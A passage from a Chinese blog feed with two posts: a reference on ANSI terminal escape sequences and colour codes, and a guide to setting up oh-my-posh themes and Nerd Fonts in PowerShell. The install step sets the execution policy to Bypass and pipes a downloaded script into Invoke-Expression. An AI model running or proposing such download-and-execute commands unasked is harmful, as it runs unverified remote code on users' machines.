        <content type="html"><![CDATA[<h1 id="ansi转义序列介绍">ANSI转义序列介绍</h1><p><code>ANSI转义序列</code>(ANSI escape sequences),或称ANSI逃逸字符,是一种用于控制终端行为的特殊转义序列.他们可以用于控制终端上的光标位置,颜色等选项,因此也称为<code>ANSI终端控制码</code>.在要打印的字符序列中加入这些控制码,终端会将其解释为对应的指令,而不是普通的字符编码.</p><p>最初不同的终端都各自加入了自己的控制序列,例如<code>VT52</code>终端等.</p><p>但是由于这些终端的实现各不相同,不得不开发了一些复杂的库(例如<code>termcap</code>)和实用程序(例如<code>tput</code>),来让我们使用同一套API来操作不同的终端.另外,很多终端需要使用字符的二进制值来发送数字,这对于某些编程语言,以及内部不使用ASCII的系统来说,将数字转换为正确的字符非常困难,甚至无法做到.</p><p><code>ANSI标准</code>试图解决这些问题,指定了一套所有终端共享的指令集,并要求用ASCII的数字字符传递所有数值信息.<code>ANSI标准</code>也经过了多次修订,支持该标准的经典终端是<code>VT100</code>,其非常成功.</p><h1 id="控制字符">控制字符</h1><p>序列中的<code>控制字符</code>会立即生效,然后才会继续处理下一个字符.</p><table><thead><tr><th>十进制</th><th>十六进制</th><th>字符</th><th>解释</th></tr></thead><tbody><tr><td>0</td><td>00</td><td>NUL  (NULL)</td><td>空字符</td></tr><tr><td>1</td><td>01</td><td>SOH  (Start Of Headling)</td><td>标题开始</td></tr><tr><td>2</td><td>02</td><td>STX  (Start Of Text)</td><td>正文开始</td></tr><tr><td>3</td><td>03</td><td>ETX  (End Of Text)</td><td>正文结束</td></tr><tr><td>4</td><td>04</td><td>EOT  (End Of Transmission)</td><td>传输结束</td></tr><tr><td>5</td><td>05</td><td>ENQ  (Enquiry)</td><td>请求</td></tr><tr><td>6</td><td>06</td><td>ACK  (Acknowledge)</td><td>回应/响应/收到通知</td></tr><tr><td>7</td><td>07</td><td>BEL  (Bell)</td><td>响铃</td></tr><tr><td>8</td><td>08</td><td>BS  (Backspace)</td><td>退格(行首不起作用)</td></tr><tr><td>9</td><td>09</td><td>HT  (Horizontal Tab)</td><td>水平制表符(如果后面已无位置则跳至行尾)</td></tr><tr><td>10</td><td>0A</td><td>LF/NL(Line  Feed/New Line)</td><td>换行键</td></tr><tr><td>11</td><td>0B</td><td>VT  (Vertical Tab)</td><td>垂直制表符</td></tr><tr><td>12</td><td>0C</td><td>FF/NP  (Form Feed/New Page)</td><td>换页键</td></tr><tr><td>13</td><td>0D</td><td>CR  (Carriage Return)</td><td>回车键</td></tr><tr><td>14</td><td>0E</td><td>SO  (Shift Out)</td><td>不用切换</td></tr><tr><td>15</td><td>0F</td><td>SI  (Shift In)</td><td>启用切换</td></tr><tr><td>16</td><td>10</td><td>DLE  (Data Link Escape)</td><td>数据链路转义</td></tr><tr><td>17</td><td>11</td><td>DC1/XON  (Device  Control 1/Transmission On)</td><td>设备控制1/传输开始</td></tr><tr><td>18</td><td>12</td><td>DC2  (Device Control 2)</td><td>设备控制2</td></tr><tr><td>19</td><td>13</td><td>DC3/XOFF  (Device  Control 3/Transmission Off)</td><td>设备控制3/传输中断</td></tr><tr><td>20</td><td>14</td><td>DC4  (Device Control 4)</td><td>设备控制4</td></tr><tr><td>21</td><td>15</td><td>NAK  (Negative Acknowledge)</td><td>无响应/非正常响应/拒绝接收</td></tr><tr><td>22</td><td>16</td><td>SYN  (Synchronous Idle)</td><td>同步空闲</td></tr><tr><td>23</td><td>17</td><td>ETB  (End of Transmission Block)</td><td>传输块结束/块传输终止</td></tr><tr><td>24</td><td>18</td><td>CAN  (Cancel)</td><td>取消</td></tr><tr><td>25</td><td>19</td><td>EM (End  of Medium)</td><td>已到介质末端/介质存储已满/介质中断</td></tr><tr><td>26</td><td>1A</td><td>SUB  (Substitute)</td><td>替补/替换</td></tr><tr><td>27</td><td>1B</td><td>ESC  (Escape)</td><td>逃离/取消(开始一个新的转义序列)</td></tr><tr><td>28</td><td>1C</td><td>FS  (File Separator)</td><td>文件分割符</td></tr><tr><td>29</td><td>1D</td><td>GS  (Group Separator)</td><td>组分隔符/分组符</td></tr><tr><td>30</td><td>1E</td><td>RS  (Record Separator)</td><td>记录分离符</td></tr></tbody></table><h1 id="ansi转义序列-非csi">ANSI转义序列(非CSI)</h1><p>下面是一些常见的非CSI转义序列,其他序列可前往文末参阅链接1查看.</p><table><thead><tr><th>ESC c</th><th>RIS</th><th>重绘屏幕.</th></tr></thead><tbody><tr><td>ESC D</td><td>IND</td><td>换行.</td></tr><tr><td>ESC E</td><td>NEL</td><td>新的一行.</td></tr><tr><td>ESC H</td><td>HTS</td><td>设置制表位.</td></tr><tr><td>ESC M</td><td>RI</td><td>翻转换行(Reverse linefeed),即向上换行还是向下换行.</td></tr><tr><td>ESC [</td><td>CSI</td><td>控制序列导入器</td></tr><tr><td>ESC % G</td><td></td><td>选择 UTF-8</td></tr><tr><td>ESC # 8</td><td>DECALN</td><td>DEC 屏幕校准测试 - 以<code>E</code>填充屏幕.</td></tr><tr><td>ESC ]</td><td>OSC</td><td>(是Operating system command的缩写)Execute screen command.</td></tr></tbody></table><h1 id="csi序列">CSI序列</h1><p><code>CSI序列</code> 由 <code>ESC[</code> 以及若干个 <code>参数字节</code> 和 若干个 <code>中间字节</code> 以及 一个 <code>最终字节</code> 组成.</p><p>其中<code>ESC</code>可以使用<code>\x1b</code>或者<code>\033</code>,即十六进制或八进制值.</p><p>各字节的范围如下:</p><table><thead><tr><th style="text-align:center">组成部分</th><th style="text-align:center">字符范围</th><th style="text-align:center">ASCII</th></tr></thead><tbody><tr><td style="text-align:center">参数字节</td><td style="text-align:center">0x30–0x3F</td><td style="text-align:center">0–9:;&lt;=&gt;?</td></tr><tr><td style="text-align:center">中间字节</td><td style="text-align:center">0x20–0x2F</td><td style="text-align:center">空格!&quot;#$%&amp;’()*+,-./</td></tr><tr><td style="text-align:center">最终字节</td><td style="text-align:center">0x40–0x7E</td><td style="text-align:center">@A–Z[]^_a–z{|}~</td></tr></tbody></table><p>常见序列格式:</p><table><thead><tr><th style="text-align:center">代码</th><th style="text-align:center">名称</th><th style="text-align:center">作用</th></tr></thead><tbody><tr><td style="text-align:center">CSI <code>n</code> A</td><td style="text-align:center">CUU – 光标上移(Cursor Up)</td><td style="text-align:center">光标向指定的方向移动n(默认1)格.如果光标已在屏幕边缘,则无效.</td></tr><tr><td style="text-align:center">CSI <code>n</code> B</td><td style="text-align:center">CUD – 光标下移(Cursor Down)</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">CSI <code>n</code> C</td><td style="text-align:center">CUF – 光标前移(Cursor Forward)</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">CSI <code>n</code> D</td><td style="text-align:center">CUB – 光标后移(Cursor Back)</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">CSI <code>n</code> E</td><td style="text-align:center">CNL – 光标移到下一行(Cursor Next Line)</td><td style="text-align:center">光标移动到下面第n(默认1)行的开头.</td></tr><tr><td style="text-align:center">CSI <code>n</code> F</td><td style="text-align:center">CPL – 光标移到上一行(Cursor Previous Line)</td><td style="text-align:center">光标移动到上面第n(默认1)行的开头.</td></tr><tr><td style="text-align:center">CSI <code>n</code> G</td><td style="text-align:center">CHA – 光标水平绝对(Cursor Horizontal Absolute)</td><td style="text-align:center">光标移动到第n(默认1)列.</td></tr><tr><td style="text-align:center">CSI <code>n</code>; <code>m</code> H</td><td style="text-align:center">CUP – 光标位置(Cursor Position)</td><td style="text-align:center">光标移动到第n行、第m列.值从1开始,且默认为<code>1</code>(左上角).例如<code>CSI ;5H</code>和<code>CSI 1;5H</code>含义相同；<code>CSI 17;H</code>、<code>CSI 17H</code>和<code>CSI 17;1H</code>三者含义相同.</td></tr><tr><td style="text-align:center">CSI <code>n</code> J</td><td style="text-align:center">ED – 擦除显示(Erase in Display)</td><td style="text-align:center">清除屏幕的部分区域.如果n是0(或缺失),则清除从光标位置到屏幕末尾的部分.如果n是1,则清除从光标位置到屏幕开头的部分.如果n是2,则清除整个屏幕(在DOS ANSI.SYS中,光标还会向左上方移动).如果n是3,则清除整个屏幕,并删除回滚缓存区中的所有行(这个特性是<a href="https://zh.wikipedia.org/wiki/Xterm">xterm</a>添加的,其他终端应用程序也支持).</td></tr><tr><td style="text-align:center">CSI <code>n</code> K</td><td style="text-align:center">EL – 擦除行(Erase in Line)</td><td style="text-align:center">清除行内的部分区域.如果n是0(或缺失),清除从光标位置到该行末尾的部分.如果n是1,清除从光标位置到该行开头的部分.如果n是2,清除整行.光标位置不变.</td></tr><tr><td style="text-align:center">CSI <code>n</code> S</td><td style="text-align:center">SU – 向上滚动(Scroll Up)</td><td style="text-align:center">整页向上滚动n(默认1)行.新行添加到底部.(非ANSI.SYS)</td></tr><tr><td style="text-align:center">CSI <code>n</code> T</td><td style="text-align:center">SD – 向下滚动(Scroll Down)</td><td style="text-align:center">整页向下滚动n(默认1)行.新行添加到顶部.(非ANSI.SYS)</td></tr><tr><td style="text-align:center">CSI <code>n</code> ; <code>m</code> f</td><td style="text-align:center">HVP – 水平垂直位置(Horizontal Vertical Position)</td><td style="text-align:center">同CUP.</td></tr><tr><td style="text-align:center">CSI <code>n</code> m</td><td style="text-align:center">SGR – 选择图形再现(Select Graphic Rendition)</td><td style="text-align:center">设置<a href="https://zh.wikipedia.org/wiki/ANSI%E8%BD%AC%E4%B9%89%E5%BA%8F%E5%88%97#%E9%80%89%E6%8B%A9%E5%9B%BE%E5%BD%A2%E5%86%8D%E7%8E%B0(SGR)%E5%8F%82%E6%95%B0">SGR参数</a>,包括文字颜色.CSI后可以是0或者更多参数,用分号分隔.如果没有参数,则视为<code>CSI 0 m</code>(重置/常规).</td></tr><tr><td style="text-align:center">CSI 5i</td><td style="text-align:center">打开辅助端口</td><td style="text-align:center">启用辅助串行端口,通常用于本地串行打印机</td></tr><tr><td style="text-align:center">CSI 4i</td><td style="text-align:center">关闭辅助端口</td><td style="text-align:center">禁用辅助串行端口,通常用于本地串行打印机</td></tr><tr><td style="text-align:center">CSI 6n</td><td style="text-align:center">DSR – 设备状态报告(Device Status Report)</td><td style="text-align:center">以<code>ESC[n;mR</code>(就像在键盘上输入)向应用程序报告光标位置(CPR),其中n是行,m是列.</td></tr><tr><td style="text-align:center">CSI s</td><td style="text-align:center">SCP – 保存光标位置(Save Cursor Position)</td><td style="text-align:center">保存光标的当前位置.</td></tr><tr><td style="text-align:center">CSI u</td><td style="text-align:center">RCP – 恢复光标位置(Restore Cursor Position)</td><td style="text-align:center">恢复保存的光标位置.</td></tr></tbody></table><h1 id="选择图形再现-sgr-参数">选择图形再现(SGR)参数</h1><table><thead><tr><th style="text-align:center">代码</th><th style="text-align:center">作用</th><th style="text-align:center">备注</th></tr></thead><tbody><tr><td style="text-align:center">0</td><td style="text-align:center">重置/正常</td><td style="text-align:center">关闭所有属性.</td></tr><tr><td style="text-align:center">1</td><td style="text-align:center">设置粗体</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">2</td><td style="text-align:center">亮度减半弱化（降低强度）</td><td style="text-align:center">未广泛支持.</td></tr><tr><td style="text-align:center">3</td><td style="text-align:center">斜体</td><td style="text-align:center">未广泛支持.有时视为反相显示.</td></tr><tr><td style="text-align:center">4</td><td style="text-align:center">下划线</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">5</td><td style="text-align:center">缓慢闪烁</td><td style="text-align:center">低于每分钟150次.</td></tr><tr><td style="text-align:center">6</td><td style="text-align:center">快速闪烁</td><td style="text-align:center">MS-DOS ANSI.SYS；每分钟150以上；未广泛支持.</td></tr><tr><td style="text-align:center">7</td><td style="text-align:center">反显</td><td style="text-align:center">前景色与背景色交换.</td></tr><tr><td style="text-align:center">8</td><td style="text-align:center">隐藏</td><td style="text-align:center">未广泛支持.</td></tr><tr><td style="text-align:center">9</td><td style="text-align:center">划除</td><td style="text-align:center">字符清晰，但标记为删除.未广泛支持.</td></tr><tr><td style="text-align:center">22</td><td style="text-align:center">正常颜色或强度</td><td style="text-align:center">不强不弱.</td></tr><tr><td style="text-align:center">23</td><td style="text-align:center">非斜体、非尖角体</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">24</td><td style="text-align:center">关闭下划线</td><td style="text-align:center">去掉单双下划线.</td></tr><tr><td style="text-align:center">25</td><td style="text-align:center">关闭闪烁</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">27</td><td style="text-align:center">关闭反显</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">28</td><td style="text-align:center">关闭隐藏</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">29</td><td style="text-align:center">关闭划除</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">30–37</td><td style="text-align:center">设置前景色</td><td style="text-align:center">参见下面的颜色表.</td></tr><tr><td style="text-align:center">38</td><td style="text-align:center">设置前景色</td><td style="text-align:center">下一个参数是<code>5;n</code>或<code>2;r;g;b</code>，见下.</td></tr><tr><td style="text-align:center">40–47</td><td style="text-align:center">设置背景色</td><td style="text-align:center">参见下面的颜色表.</td></tr><tr><td style="text-align:center">48</td><td style="text-align:center">设置背景色</td><td style="text-align:center">下一个参数是<code>5;n</code>或<code>2;r;g;b</code>，见下.</td></tr><tr><td style="text-align:center">53</td><td style="text-align:center">上划线</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">55</td><td style="text-align:center">关闭上划线</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">90–97</td><td style="text-align:center">设置明亮的前景色</td><td style="text-align:center">aixterm（非标准）.</td></tr><tr><td style="text-align:center">100–107</td><td style="text-align:center">设置明亮的背景色</td><td style="text-align:center">aixterm（非标准）.</td></tr></tbody></table><h1 id="颜色">颜色</h1><h2 id="3-4位">3/4位</h2><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240220100602854.png" alt="image-20240220100602854" style="zoom:50%;" /><p>例如可以使用<code>\x1b[1;5;33;104m</code>来设置前景色为黄色,背景色为亮蓝色,粗体并缓慢闪烁.</p><h2 id="8位">8位</h2><p>即256颜色.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ESC[ … 38;5;&lt;n&gt; … m选择前景色（n是下表中的一种）</span><br><span class="line">ESC[ … 48;5;&lt;n&gt; … m选择背景色</span><br><span class="line">    0-  7：标准颜色（同ESC [ 30–37 m）</span><br><span class="line">    8- 15：高强度颜色（同ESC [ 90–97 m）</span><br><span class="line">    16-231：6 × 6 × 6 立方（216色）: 16 + 36 × r + 6 × g + b (0 ≤ r, g, b ≤ 5)</span><br><span class="line">    232-255：从黑到白的24阶灰度色</span><br></pre></td></tr></table></figure><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240220100950925.png" alt="image-20240220100950925" style="zoom:50%;" /><h2 id="24位">24位</h2><p>即RGB色彩.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ESC[ … 38;2;&lt;r&gt;;&lt;g&gt;;&lt;b&gt; … m选择RGB前景色</span><br><span class="line">ESC[ … 48;2;&lt;r&gt;;&lt;g&gt;;&lt;b&gt; … m选择RGB背景色</span><br></pre></td></tr></table></figure><h1 id="附录">附录</h1><p>参考:</p><ul><li><a href="https://zh.wikipedia.org/wiki/ANSI%E8%BD%AC%E4%B9%89%E5%BA%8F%E5%88%97">https://zh.wikipedia.org/wiki/ANSI转义序列</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>oh-my-posh美化终端</title>
      <link href="/20243a60a2d0dadf/"/>
      <url>/20243a60a2d0dadf/</url>
      
        <content type="html"><![CDATA[<p>使用<code>oh-my-posh</code>工具来美化powershell终端.</p><h1 id="安装oh-my-posh">安装oh-my-posh</h1><p>使用powershell输入如下命令来安装oh-my-posh到你的电脑:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-ExecutionPolicy</span> Bypass <span class="literal">-Scope</span> <span class="keyword">Process</span> <span class="literal">-Force</span>; <span class="built_in">Invoke-Expression</span> ((<span class="built_in">New-Object</span> System.Net.WebClient).DownloadString(<span class="string">&#x27;https://ohmyposh.dev/install.ps1&#x27;</span>))</span><br></pre></td></tr></table></figure><p>该命令将安装<code>oh-my-posh.exe</code>应用程序和配套的各种<code>theme</code>主题.</p><p>安装后建议重新启动终端.</p><br><p>然后powershell中输入<code>oh-my-posh</code>尝试启动该程序,如果未报错则安装成功:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240218150959869.png" alt="image-20240218150959869" style="zoom: 33%;" /><p>接下来就可以开始配置主题了.</p><h1 id="配置字体">配置字体</h1><p>这一步是否必须还不清楚,不过貌似只能搭配<a href="https://www.nerdfonts.com/">Nerd</a>字体使用.</p><p>在该链接<code>https://www.nerdfonts.com/</code>中下载字体,选择自己喜欢的字体,我选择的是这个:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240218151302524.png" alt="image-20240218151302524" style="zoom:50%;" /><p>直接下载压缩包后,解压,里面是一大堆<code>ttf</code>后缀的字体文件,windows可以直接右键安装:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240218151544693.png" alt="image-20240218151544693" style="zoom:50%;" /><p>我这里将所有下载的ttf文件批量安装:</p><p>按win键搜索<code>font</code>关键字,打开<code>控制面板-字体</code>界面:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240218151651818.png" alt="image-20240218151651818" style="zoom:50%;" /><p>全选<code>ttf</code>文件,注意不要把<code>LICENSE.txt</code>和<code>README.md</code>文件选择,直接拖入控制面板中:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240218151916494.png" alt="image-20240218151916494" style="zoom:50%;" /><p>等待全部安装完成即可.</p><br><p>然后就可以正式开始字体和主题的选择了.</p><h1 id="选择字体">选择字体</h1><p>以管理员权限打开powershell,然后按<code>ctrl+ shift + ,</code>快捷键,会打开一个<code>settings.json</code>,在里面找到该段:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;profiles&quot;</span>: </span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;defaults&quot;</span>: &#123;&#125;,</span><br><span class="line">    其他代码...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在里面填写如下配置,此时就可以选择你安装的字体:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;profiles&quot;</span>: </span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;defaults&quot;</span>: </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;font&quot;</span>: </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;face&quot;</span>: <span class="string">&quot;MesloLGM Nerd Font&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    其他代码...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>比如上述我安装的是<code>MesloLGM Nerd Font</code>字体,在前面的控制面板中找到该字体的完整名称(必须严格一致,否则会powershell报错找不到改字体):</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240218152638650.png" alt="image-20240218152638650" style="zoom:50%;" /><p>修改完成后一定保存,然后再次检查刚刚的powershell是否报错和新字体是否成功应用,成功后即可关闭该json文件.</p><h1 id="配置终端启动文件和主题">配置终端启动文件和主题</h1><p>为了使用主题,我们要将对应的命令写入到powershell的启动配置文件中.</p><p>在powershell中运行该命令:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">notepad <span class="variable">$PROFILE</span></span><br></pre></td></tr></table></figure><p>这样以记事本打开配置文件.</p><p>如果上述命令报错,则确保先创建配置文件,使用该命令:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">New-Item</span> <span class="literal">-Path</span> <span class="variable">$PROFILE</span> <span class="literal">-Type</span> File <span class="literal">-Force</span></span><br></pre></td></tr></table></figure><p>然后再次尝试即可.</p><p>假设我们选择该主题:<code>wholespace</code>(我觉得最好看的一个),在打开的配置文件中(.ps1后缀的脚本文件)中写入如下内容:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">oh</span><span class="literal">-my-posh</span> init pwsh <span class="literal">--config</span> <span class="string">&#x27;C:\Users\admin\AppData\Local\Programs\oh-my-posh\themes\wholespace.omp.json&#x27;</span> |  <span class="built_in">Invoke-Expression</span></span><br></pre></td></tr></table></figure><p>该路径<code>C:\Users\admin\AppData\Local\Programs\oh-my-posh\themes\</code>是默认的主题配置文件保存路径.</p><p>然后保存后关闭记事本.</p><p>接下来尝试应用该配置:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">. <span class="variable">$PROFILE</span></span><br></pre></td></tr></table></figure><p>如果终端成功发生变化则说明成功.</p><br><p>接下来选择自己喜欢的主题,使用该命令即可罗列出所有的主题名及其效果:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-PoshThemes</span></span><br></pre></td></tr></table></figure><p>结果如下:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240218154039275.png" alt="image-20240218154039275" style="zoom:50%;" /><p>找到自己喜欢的一款主题,例如图中的<code>atomic</code>,将该名称替换掉前面启动配置文件中的对应内容:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240218154210844.png" alt="image-20240218154210844"></p><p>改成这样:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">oh-my-posh init pwsh --config <span class="string">&#x27;C:\Users\admin\AppData\Local\Programs\oh-my-posh\themes\atomic.omp.json&#x27;</span> |  Invoke-Expression</span><br></pre></td></tr></table></figure><p>然后重新运行<code>. $PROFILE</code>即可.</p><br><p>所以,我们完全可以在该目录下新建一个配置文件,进行自己的定制化.</p><p>配置文件的编写可以参考官方文档.</p><p>我这里基于<code>wholespace</code>主题做了一点魔改,效果如下:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240616225241.png" alt="image.png"></p><p>配置文件内容如下,喜欢的朋友可以自取:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span 